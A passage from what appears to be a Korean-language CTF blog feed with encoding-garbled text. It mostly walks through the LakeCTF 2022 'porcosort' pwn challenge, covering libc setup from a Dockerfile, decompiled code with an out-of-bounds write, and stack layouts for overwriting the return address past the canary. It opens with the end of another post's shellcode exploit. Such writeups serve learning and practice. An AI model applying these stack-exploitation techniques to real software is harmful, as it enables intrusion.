1</span></span><br><span class="line"><span class="string">        mov rdi, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Team P3WP3Wâ€™s writeups (no link)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - porcosort (Dockerfile, libc, oob)</title>
      <link href="/221004-lakectf2022-porcosort/"/>
      <url>/221004-lakectf2022-porcosort/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 22.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬, ë„ì»¤íŒŒì¼</p><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>libc ë•Œë¬¸ì—.. ê³ ìƒì„ ì¢€ í–ˆì§€ë§Œ ê²°ë¡ ì ìœ¼ë¡œëŠ” ìž˜ í•´ê²°í–ˆë‹¤. </p><p>ë§¨ ì²˜ìŒì— Ubuntu 20.04ì—ì„œ ë¶„ì„ ë° ìµìŠ¤ ì§„í–‰í•˜ë ¤ê³  í–ˆëŠ”ë° ì‹¤í–‰ì´ ìž˜ ë˜ì§€ ì•Šì•„ ê·¸ëƒ¥ Ubuntu 22.04ì—ì„œ ì§„í–‰í–ˆë‹¤. ë²„ì „ì„ ì˜¬ë¦° ì´ìœ ëŠ” 20.04ì—ì„œ ì‹¤í–‰í•  ë•Œ GLibc? ê·¸ ë²„ì „ì´ ë‚®ì•„ì„œ ì‹¤í–‰ì´ ì•ˆëœë‹¤ê³  ì—ëŸ¬ ë¬¸êµ¬ê°€ ë–´ê¸° ë•Œë¬¸ì— ë‹¹ì—°í•˜ê²Œë„(?) 22.04ë¡œ ë²„ì „ì„ ì˜¬ë¦´ ìƒê°ì„ í•˜ì˜€ê¸° ë•Œë¬¸ì´ë‹¤. í•˜ì§€ë§Œ ê²°ë¡ ì ìœ¼ë¡œ Ubuntu 22.04ì˜ libcë„ ì•„ë‹ˆì—ˆê¸° ë•Œë¬¸ì—(archì˜ libcì˜€ìŒ) êµ³ì´ 22.04ë¡œ ë²„ì „ì„ ì•ˆì˜¬ë¦¬ê³  ë¬¸ì œë¥¼ í’€ ìˆ˜ë„ ìžˆì—ˆë‹¤.</p><p>ctf ì±Œë¦°ì§€ì—ì„œ ë„ì»¤íŒŒì¼ì„ ì œê³µí•˜ëŠ” ì´ìœ ëŠ” libc ë²„ì „ ë•Œë¬¸ì´ë‹¤. libc íŒŒì¼ì„ ë˜ì ¸ì¤€ ê²ƒì€ ì•„ë‹ˆì§€ë§Œ libcë¥¼ ê±°ì ¸ì¤€ ê²ƒì´ë‚˜ ë‹¤ë¦„ì—†ë‹¤. ì•Œê³ ìžˆì—ˆì§€ë§Œ í™œìš©í•˜ëŠ” ë°©ë²•ì„ ì œëŒ€ë¡œ ì•Œì§€ ëª»í–ˆë‹¤. libc ë•Œë¬¸ì— ì‚½ì§ˆì„ ë§Žì´ í•´ì„œ ê²°êµ­ ë¡¸ì—…ì„ ì°¾ì•„ë³´ê³  í•´ë‹¹ ë¶€ë¶„ì„ ë°”ë¡œ í•´ê²°í•  ìˆ˜ ìžˆì—ˆë‹¤. </p><p><a href="https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup">https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup</a></p><p>ì´ë²ˆ ê¸°íšŒë¡œ ë„ì»¤íŒŒì¼ì„ ëˆˆì—¬ê²¨ë´ì•¼ê² ë‹¤ëŠ” ìƒê°ê³¼ libcë¥¼ ê°€ì ¸ì˜¤ê³  patchí•˜ëŠ” ë°©ë²•ì„ ë°°ì› ë‹¤. ì´ì œë¼ë„ ì•Œê²Œ ë˜ì–´ì„œ ë‹¤í–‰ì´ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë¡œì»¬ì—ì„œ-ë¬¸ì œ-í™˜ê²½-ì„¸íŒ…í•˜ê¸°-feat-ë„ì»¤íŒŒì¼ì´-ì£¼ì–´ì¡Œì„-ë•Œ-libc-ê°€ì ¸ì˜¤ê¸°"><a href="#ë¡œì»¬ì—ì„œ-ë¬¸ì œ-í™˜ê²½-ì„¸íŒ…í•˜ê¸°-feat-ë„ì»¤íŒŒì¼ì´-ì£¼ì–´ì¡Œì„-ë•Œ-libc-ê°€ì ¸ì˜¤ê¸°" class="headerlink" title="ë¡œì»¬ì—ì„œ ë¬¸ì œ í™˜ê²½ ì„¸íŒ…í•˜ê¸° (feat. ë„ì»¤íŒŒì¼ì´ ì£¼ì–´ì¡Œì„ ë•Œ libc ê°€ì ¸ì˜¤ê¸°)"></a>ë¡œì»¬ì—ì„œ ë¬¸ì œ í™˜ê²½ ì„¸íŒ…í•˜ê¸° (feat. ë„ì»¤íŒŒì¼ì´ ì£¼ì–´ì¡Œì„ ë•Œ libc ê°€ì ¸ì˜¤ê¸°)</h3><p>Ubuntu 22.04ì—ì„œ <code>ldd</code> ëª…ë ¹ì„ í†µí•´ ë°”ì´ë„ˆë¦¬ì— ë§¤í•‘ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œ ìˆ˜ ìžˆë‹¤. Ubuntu 20.04ì—ì„œ ì§„í–‰í–ˆì„ ë•ŒëŠ” ë²„ì „ì— ë§žëŠ” libcê°€ ì—†ì–´ì„œ ì‹¤í–‰ì¡°ì°¨ ë˜ì§€ ì•Šì•˜ëŠ”ë°, ì—¬ê¸°ì„  ê·¸ëž˜ë„ ì‹¤í–‰ì€ ëœë‹¤. í•˜ì§€ë§Œ ì•„ë¬´ë¦¬ ì‹¤í–‰ì´ ë˜ë”ë¼ë„ remoteì™€ í™˜ê²½ì´ ë‹¤ë¥¼ ìˆ˜ë„ ìžˆê¸° ë•Œë¬¸ì— ì œê³µëœ ë„ì»¤íŒŒì¼ì„ ê¼­ í™•ì¸í•´ì•¼ í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffc8615e000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f976d66e000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f976d8ad000)</span><br></pre></td></tr></table></figure><p>ë„ì»¤íŒŒì¼ì„ í™•ì¸í•´ë³´ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM docker.io/library/archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 AS builder</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ë¬¸ì œ í™˜ê²½ì´ Ubuntuê°€ ì•„ë‹ˆë¼ arch linuxìž„ì„ ì•Œ ìˆ˜ ìžˆë‹¤. ì €ê¸°ë¡œ ì ‘ì†í•´ì„œ libcë¥¼ ê°€ì ¸ì™€ ë°”ì´ë„ˆë¦¬ë¥¼ patchí•˜ëŠ” ìž‘ì—…ì„ ì§„í–‰í•˜ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v `pwd`:/data archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 bash</span><br></pre></td></tr></table></figure><p>ë„ì»¤ë¥¼ ì‹¤í–‰í•˜ë©´ ì»¨í…Œì´ë„ˆì— ì ‘ì†í•  ìˆ˜ ìžˆë‹¤.<br>ë‹¤ë¥¸ í„°ë¯¸ë„ ì°½ì„ ì—´ì–´ì„œ ì»¨í…Œì´ë„ˆë¡œ ë¬¸ì œ ë°”ì´ë„ˆë¦¬ë¥¼ ë„£ì–´ì£¼ê³  <code>ldd</code> ëª…ë ¹ì–´ë¡œ ë§¤í•‘ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸í•´ë³´ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/jir4vvit/ctf/lake/porcosort2/porcorsort ce9c17249f0e:/home/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ce9c17249f0e home]# ldd porcosort</span><br><span class="line">linux-vdso.so.1 (0x00007fff4e6ca000)</span><br><span class="line">libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f2f35895000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f2f35aae000)</span><br></pre></td></tr></table></figure><p>ë‹¤ë¥¸ í„°ë¯¸ë„ì—ì„œ ì•„ëž˜ ë‘ ëª…ë ¹ì–´ë¡œ ì»¨í…Œì´ë„ˆ ì•ˆì˜ ldì™€ libc íŒŒì¼ì„ ê°€ì ¸ì˜¤ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp ce9c17249f0e:/usr/lib/libc.so.6 /home/jir4vvit/ctf/lake/porcosort2/</span><br><span class="line">docker cp ce9c17249f0e:/usr/lib64/ld-linux-x86-64.so.2 /home/jir4vvit/ctf/lake/porcosort2/</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ¼ ì´ì œ ë¡œì»¬ì— ldì™€ libcê°€ ì €ìž¥ì´ ë˜ê³ , <code>patchelf</code>ë¥¼ ì´ìš©í•´ì„œ ë°”ì´ë„ˆë¦¬ë¥¼ íŒ¨ì¹˜í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffff7d92000)</span><br><span class="line">./libc.so.6 (0x00007f3122b16000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f3122d2f000)</span><br></pre></td></tr></table></figure><p><code>--set-interpreter &lt;ld&gt;</code>: ë‹¤ìš´ë°›ì€ ld(ë¡œë”)ë¥¼ ì§€ì •<br><code>--replace-needed &lt;libc&gt;</code>: libc êµì²´ </p><p>ê·¸ëŸ¼ ì´ì œ ë¬¸ì œ í™˜ê²½(remote)ì™€ localì´ ë˜‘ê°™ì•„ì¡Œë‹¤! ê°€ì ¯ ì°¾ì„ ì¼ ìžˆìœ¼ë©´ ê°€ì ¸ì˜¨ libcë‚˜ ldì—ì„œ ê°€ì ¯ì°¾ìœ¼ë©´ ëœë‹¤.</p><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ì „ë¶€ ë‹¤ ê±¸ë ¤ìžˆë‹¤. :(</p><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><p>ìš°ë¦¬ì˜ ì¹œêµ¬ IDAì™€ í•¨ê»˜ ì°¨ê·¼ì°¨ê·¼ ë¶„ì„í•˜ë©´ì„œ ì·¨ì•½ì ì„ ì°¾ì•„ë³´ìž.</p><h4 id="vuln-í•¨ìˆ˜"><a href="#vuln-í•¨ìˆ˜" class="headerlink" title="vuln í•¨ìˆ˜"></a>vuln í•¨ìˆ˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  __int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">    stack_buf[i] = _bss_start;</span><br><span class="line">  __asm &#123; rdrand  rbx &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Have a gift: %p\n&quot;</span>, stack_buf[(_RBX ^ a1) % <span class="number">0x30</span>]);<span class="comment">// _IO_2_1_stdout_</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many numbers to sort? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;sort_cnt);            <span class="comment">// 48</span></span><br><span class="line">  <span class="keyword">if</span> ( sort_cnt &gt; <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  read_numbers(stack_buf, sort_cnt);</span><br><span class="line">  get_gnomed(stack_buf, sort_cnt);              <span class="comment">// ì •ë ¬í•˜ëŠ” ì½”ë“œ</span></span><br><span class="line">                                                <span class="comment">// ì—¬ê¸° sort_cnt ê°’ ì¡°ìž‘ ê°€ëŠ¥ (48ë³´ë‹¤ í° ìˆ˜ ë„£ê¸° ê°€ëŠ¥)</span></span><br><span class="line">                                                <span class="comment">// ì •í™•ížˆëŠ” read_numbersì—ì„œ oob write ë°œìƒ</span></span><br><span class="line">  <span class="keyword">return</span> canary - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> í•¨ìˆ˜ì—ì„œ <code>_IO_2_1_stdout_</code>ì„ ì¶œë ¥í•´ ì¤€ë‹¤. (gdbë¡œ ë°”ë¡œ ì°ì–´ë´¤ë‹¤.)<br>ê·¸ë¦¬ê³  ì–´ë– í•œ ìˆ˜ë¥¼ ìž…ë ¥ë°›ê³  ê·¸ ìž…ë ¥ê°’ì„ ì¸ìžë¡œ <code>read_numbers</code> í•¨ìˆ˜ì™€ <code>get_gnomed</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.</p><h4 id="read-numbers-í•¨ìˆ˜"><a href="#read-numbers-í•¨ìˆ˜" class="headerlink" title="read_numbers í•¨ìˆ˜"></a>read_numbers í•¨ìˆ˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_numbers</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = cnt;</span><br><span class="line">  <span class="keyword">for</span> ( i = cnt; i &gt; <span class="number">0</span>; --i )                   <span class="comment">// ë’¤ì—ì„œë¶€í„° ì±„ìš°ê¸°</span></span><br><span class="line">                                                <span class="comment">// cnt ~ 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    buf[i] = <span class="string">&#x27;*&#x27;</span>;                               <span class="comment">// *ë¡œ ì±„ìš°ê¸°</span></span><br><span class="line">    result = __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;buf[i]);   <span class="comment">// * ì°ì€ ê³³ì— ê°’ ì“°ê¸° ê°€ëŠ¥</span></span><br><span class="line">                                                <span class="comment">// (ìœ„ì—ì„œ í•œ * ì±„ìš°ê¸°ëŠ” ê·¸ëƒ¥ ì´ˆê¸°í™” ìž‘ì—…)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë‘ ë²ˆì§¸ ì¸ìž <code>cnt</code>ëŠ” ë‚˜ì˜ ìž…ë ¥ ê°’ì´ë‹¤. ê²°ë¡ ì ìœ¼ë¡œ ìŠ¤íƒì— ë‚´ê°€ ì›í•˜ëŠ” ë°ì´í„°ë¥¼ ë„£ì„ ìˆ˜ ìžˆë‹¤.</p><p>ì´ë•Œ oob writeê°€ ê°€ëŠ¥í•˜ë‹¤. ì¸ìžë¡œ ë„˜ì–´ì˜¨ <code>buf</code>ëŠ” í¬ê¸°ê°€ 48ì´ë‹¤. ì´ë•Œ <code>cnt</code>ê°€ 48ì´ë¼ë©´ <code>&amp;buf[48]</code>ì— ì ‘ê·¼í•˜ì—¬ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48] ~ &amp;buf[1]</span><br></pre></td></tr></table></figure><p>oob writeê°€ ë°œìƒí•˜ì§€ ì•Šìœ¼ë ¤ë©´(ì›ëž˜ëŒ€ë¡œë¼ë©´) ì•„ëž˜ì²˜ëŸ¼ 0ë¶€í„° <code>cnt-1</code>ê¹Œì§€ë§Œ ì ‘ê·¼í•´ì•¼ê² ì§€.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48-1] ~ &amp;buf[0]</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ¼ ì´ì œ ìš°ë¦¬ê°€ oobë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìžˆëŠ” <code>&amp;buf[48]</code>ì— ì €ìž¥ëœ ê°’ì´ ë­”ì§€ ê¶ê¸ˆí•˜ë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure><p><code>buf</code> ë°”ë¡œ ë°‘ì— <code>cnt</code>ê°€ ì¡´ìž¬í•œë‹¤. ê·¸ë ‡ë‹¤. <code>&amp;buf[48]</code>ì—ëŠ” ìš°ë¦¬ì˜ ìž…ë ¥ê°’ì¸ <code>cnt</code>ê°€ ì €ìž¥ë˜ì–´ ìžˆë‹¤. ì´ ë§ ì¦‰ìŠ¨.. <code>read_numbers</code> í•¨ìˆ˜ê°€ ëë‚˜ê³  ë‹¤ìŒ í˜¸ì¶œë  <code>get_gnomed</code> í•¨ìˆ˜ì˜ ì¸ìžë¥¼ ì¡°ìž‘ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤.</p><h4 id="get-gnomed-í•¨ìˆ˜"><a href="#get-gnomed-í•¨ìˆ˜" class="headerlink" title="get_gnomed í•¨ìˆ˜"></a>get_gnomed í•¨ìˆ˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_gnomed</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *curr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  curr = buf;</span><br><span class="line">  <span class="keyword">while</span> ( curr &lt; &amp;buf[cnt] )                    <span class="comment">// ì²˜ìŒì—” stdout addr</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( curr == buf || *curr &gt;= *(curr - <span class="number">1</span>) ) <span class="comment">// ìŒìˆ˜ë¡œ í¬ê¸° ë¹„êµ</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++curr;                                   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      *(curr - <span class="number">1</span>) ^= *curr;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      --curr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê·¸ëƒ¥ í¬ê¸° ìˆœìœ¼ë¡œ ì •ë ¬í•˜ëŠ” ì½”ë“œì´ë‹¤. ëŒ€ì†Œë¹„êµì— ë§ˆìš°ìŠ¤ë¥¼ ì˜¬ë ¤ë³´ë©´ <code>*curr &gt;= *(curr-1)</code> ì—ì„œ signedë¡œ ë¹„êµë¥¼ í•˜ê³  ìžˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìžˆë‹¤. ì°¸ê³ ë¡œ ì´ ì‚¬ì‹¤ì€ ìµìŠ¤í•˜ëŠ” ë°ì— ìžˆì–´ì„œ ì•„ì£¼ ì¤‘ìš”í•˜ë‹¤.. </p><p>ìŠ¤íƒì— ì›í•˜ëŠ” ê°’ë“¤ì„ ì ìœ¼ë©´ ê²°êµ­ ì—¬ê¸°ì—ì„œ ë‹¤ì‹œ ì •ë ¬í•˜ê²Œ ë˜ëŠ”ë°, í¬ê¸° ìˆœìœ¼ë¡œ ì •ë ¬ì´ ë˜ë‹ˆê¹Œ ê°’ì„ ì–´ë–»ê²Œ ë„£ì„ ì§€ ìƒê°ì„ ìž˜í•´ì•¼ í•œë‹¤.</p><p>ìŒ ì·¨ì•½ì ì„ ì„¤ëª…í•˜ëŠ” í•´ë‹¹ ë¶€ë¶„ì—ì„œëŠ” ì‚´ì§ ë§žì§€ ì•ŠëŠ” ê²ƒ ê°™ì§€ë§Œ ì´ì–´ì„œ ì„¤ëª…í•˜ëŠ” ê²ƒì´ ì´í•´í•˜ê¸°ì— ì‰¬ìš´ ê²ƒ ê°™ì•„ ë°”ë¡œ ìŠ¤íƒì„ ë³´ì—¬ì£¼ê² ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x00007f29d7a406c00x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x00007f29d788ca400x00007f29d786a1d6</span><br><span class="line">0x7ffe3265c1c0:0x00000000000000390xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000xa3d3707cd6109c68</span><br><span class="line">0x7ffe3265c1e0:0x00007ffe3265c2400x0000562e91ec649e // í•´ë‹¹ í•¨ìˆ˜ê°€ ëë‚˜ê³  0x0000562e91ec649eë¡œ ê°</span><br><span class="line">0x7ffe3265c1f0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c200:0x80000000000068730x0000000000000000</span><br></pre></td></tr></table></figure><p>ì´ ê°’ë“¤ì„ <code>get_gnomed</code> í•¨ìˆ˜ë¥¼ ê±°ì¹˜ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1c0:0xa3d3707cd6109c680xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000x0000000000000039</span><br><span class="line">0x7ffe3265c1e0:0x0000562e91ec649e0x00007f29d786a1d6 // 0x7ffe3265c1e8: ret address</span><br><span class="line">0x7ffe3265c1f0:0x00007f29d788ca400x00007f29d7a406c0 // 0x7ffe3265c1f0: system address</span><br><span class="line">0x7ffe3265c200:0x00007ffe3265c2400x0000000000000000</span><br></pre></td></tr></table></figure><p>í˜„ìž¬ ì¹´ë‚˜ë¦¬ëŠ” <code>0x7ffe3265c1c8</code> ì£¼ì†Œì— ìœ„ì¹˜í•œë‹¤.</p><p>ìµìŠ¤ë¥¼ ìž‘ì„±í•  ë•Œ ê°€ìž¥ ê¹Œë‹¤ë¡œìš´ ì ì€ ì¹´ë‚˜ë¦¬ì˜ ê°’ì´ ëžœë¤ì´ëž€ ì ì´ë‹¤. ì´ ìœ„ì¹˜ê°€ ë°”ë€Œë©´ ë‹¹ì—°í•˜ê²Œë„ <code>*** stack smashing detected ***: terminated</code>ì´ ë°œìƒí•˜ëŠ”ë°, ì¹´ë‚˜ë¦¬ì˜ ê°’ì€ ëžœë¤ì´ê¸° ë•Œë¬¸ì— ì ë‹¹ížˆ ìž‘ì€ ìˆ˜(ìŒìˆ˜?)ì´ê¸¸ ê¸°ëŒ€í•´ì•¼ í•œë‹¤. ì´ ë•Œë¬¸ì— ìµìŠ¤ ì½”ë“œëŠ” í™•ë¥ ì´ ì¡°ê¸ˆ ìžˆë‹¤.</p><p>ê·¸ë¦¬ê³  <code>0x8000000000006873</code>ê°€ ë³´ì´ëŠ”ë° ì´ëŠ” 